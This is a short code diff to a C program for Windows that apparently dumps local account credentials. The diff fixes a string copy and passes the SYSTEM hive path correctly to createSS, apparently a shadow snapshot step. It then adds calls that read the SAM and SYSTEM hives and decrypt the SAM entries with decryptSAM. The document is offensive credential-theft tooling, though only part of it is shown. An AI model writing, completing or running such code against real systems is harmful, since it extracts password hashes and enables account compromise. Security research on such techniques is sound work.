@@ -188,7 +188,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 			}
 
 			PSAM sam = (PSAM)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAM));
-			wcscpy_s(sam->rid, keyInfoSubKeysBasic->NameLength, keyInfoSubKeysBasic->Name);
+			wcscpy_s(sam->rid, MAX_KEY_LENGTH, keyInfoSubKeysBasic->Name);
 
 			getClasses(sam);
 
@@ -649,11 +649,11 @@ int main(int argc, char** argv) {
 
 	// Time to debug as always works at first :D
 	// 
-	//ULONG size;
+	ULONG size;
 	//getSAM(NULL, &size);
 
 	// Array of PSAM
-	//PSAM sam[MAX_SAM_ENTRIES] = {};
+	PSAM sam[MAX_SAM_ENTRIES] = {};
 
 	//getSAM(sam, &size);
 
@@ -663,5 +663,10 @@ int main(int argc, char** argv) {
 
 	WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
 	WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
-	createSS(sourcePathFileSAM, sourcePathFileSAM);
+	createSS(sourcePathFileSAM, sourcePathFileSYSTEM);
+
+	getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+	getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+
+	decryptSAM(sam, size / sizeof(SAM));
 }
